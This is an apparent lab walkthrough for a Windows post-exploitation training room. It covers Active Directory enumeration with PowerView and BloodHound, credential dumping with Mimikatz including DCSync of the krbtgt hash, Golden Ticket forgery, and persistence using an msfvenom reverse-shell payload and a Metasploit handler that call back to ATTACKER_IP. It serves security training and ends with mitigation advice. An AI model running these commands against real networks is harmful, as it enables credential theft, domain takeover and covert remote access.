## Room + Target
- Room: Post-Exploitation Basics  
- Target: `10.201.118.160` (Windows Server v1.1)  
- Tools used (AttackBox): PowerView (PowerShell), SharpHound (BloodHound ingestor), Mimikatz, Metasploit, msfvenom, RDP/WinRM clients, Impacket tools (if needed)

---

## 1) Boot & Connectivity
- ensure machine is running and reachable
```bash
ping -c 3 10.201.118.160
```

- test common Windows services
```bash
nmap -sC -sV -p 21,22,80,135,139,445,3389,5985,5986 10.201.118.160 -oN nmap_initial.txt
```

_Notes:_ Expect common Windows ports: 135 (RPC), 445 (SMB), 3389 (RDP), 5985/5986 (WinRM).

---

## 2) Initial post-shell context (assume you already have a shell)
If you already have a shell on the box, start by getting basic context:
```bash
whoami
hostname
ipconfig /all
systeminfo
set
net user
query user
```

---

## 3) Enumeration with PowerView (PowerShell)
Load PowerView (copy `PowerView.ps1` to target or use Invoke-Expression from memory if permitted by the lab):

Common PowerView queries:
- list domain controllers
```bash
Get-NetDomainController
```
- list domain users (basic)
```bash
Get-NetUser -Domain DOMAINNAME
```
- list domain computers
```bash
Get-NetComputer -FullData
```
- find interesting shares
```bash
Invoke-ShareFinder -Verbose
```

- find localadmins on remote computers
```bash
Get-NetLocalGroup -ComputerName TARGET -GroupName Administrators
```
- find unconstrained delegation / SPNs
```bash
Get-NetComputer -FullData | ? { $_.TrustedForDelegation -eq $true }
```
- find interesting ACLs
```bash
Get-ObjectAcl -SamAccountName 'DOMAIN\SomeAccount' -ResolveGUIDs
```

Record outputs (user accounts, machine names, DC name, domain name).

---

## 4) BloodHound collection (SharpHound)
Collect data for BloodHound analysis using SharpHound (PowerShell ingestor) from the Windows host:

Steps (on target or via remote code execution):
- run SharpHound ingestor (example)
```bash
Invoke-BloodHound -CollectionMethod All -Domain DOMAINNAME -ZipFileName bloodhound.zip
```
- or run SharpHound.exe and collect zip for local download
```bash
.\SharpHound.exe -c All
```

Transfer `bloodhound.zip` to your AttackBox and import into BloodHound GUI to analyze paths, high-value principals, and possible lateral movement routes.

Key BloodHound checks:
- Shortest paths to Domain Admins
- Accounts with DC-Backup rights / DCSync potential
- ACLs that allow privilege escalation
- Machines where high-privilege credentials are cached

---

## 5) Dumping hashes & credentials with Mimikatz
**Goal:** locate secrets (cleartext creds / NTLM hashes / krbtgt hash) for potential ticket attacks.

Example interactive Mimikatz usage (high-level):
- on the host, run mimikatz (requires administrative/right privileges)
```bash
privilege::debug
sekurlsa::logonpasswords # dumps cleartext creds from LSASS (if memory is accessible)
```
- To dump NTDS or perform DCSync (if permitted/available)
```bash
lsadump::dcsync /domain:DOMAIN /user:krbtgt
```

_Notes:_ `sekurlsa::logonpasswords` shows cached creds and plaintext where available. `lsadump::dcsync` can fetch password hashes for users if you have rights (or via abusing DC replication rights).

**Capture & save outputs** showing any service account or krbtgt hash found.

---

## 6) Golden Ticket (high-level overview)
If you can obtain the `krbtgt` NTLM hash, a Golden Ticket can be forged to impersonate any domain user (including Domain Admin). High-level steps:
1. Obtain `krbtgt` hash (via `lsadump::dcsync` or other means).  
2. Use a Kerberos tool (Mimikatz) to craft a ticket using `krbtgt` hash + domain details.  
3. Inject the ticket into your session (Mimikatz `kerberos::ptc` / `kerberos::golden` commands) to become domain admin.

**Important:** only perform in authorized lab environment. Save Mimikatz output that shows `krbtgt` hash and a successful ticket injection.

---

## 7) Server Manager & Windows enumeration
Use built-in tools and commands to gather system info, roles, and services:
- on the host
```bash
Get-Service
sc query
Get-ChildItem 'C:\Users' -Force
type C:\Windows\System32\drivers\etc\hosts
```
- Server Manager / roles
```bash
Get-WindowsFeature | Where Installed
```
- check for backup tools, scheduled tasks
```sql
schtasks /query /fo LIST /v
```

Look for:
- Configuration files with cleartext creds
- Unprivileged services running with high privileges
- Scheduled tasks with writable binaries

---

## 8) Maintaining Access (persistence)
Examples of persistence techniques in a lab (document everything):
- Add new service or set a binary to run as SYSTEM (only in lab)
- Create scheduled task that runs a reverse shell binary
- Use Metasploit persistence module (e.g., `persistence -U -i 60 -p 4444 -r ATTACKER_IP`)
- Generate a payload with msfvenom (lab only) and register it as a service / scheduled task

Example msfvenom payload generation (for lab only):
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o persist_payload.exe
```

- Start handler:
```
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

---

## 9) Cleanup & Evidence
- Save output files (mimikatz dumps, BloodHound zip, screenshots) in `screenshots/` with descriptive filenames.  
- Record the exact commands you used and the timestamps.  
- In `TASKS.md` paste the direct proof for each room question (command + output or screenshot).

---

## 10) Observations & Post-mortem
- Note interesting vectors (e.g., DCSync possible, weak/cleartext service account creds, exposed shares).  
- Suggested mitigation: restrict AD replication and DCSync rights, rotate krbtgt after an incident, enable LAPS, reduce account privileges, enable LSASS protection and Credential Guard where possible.
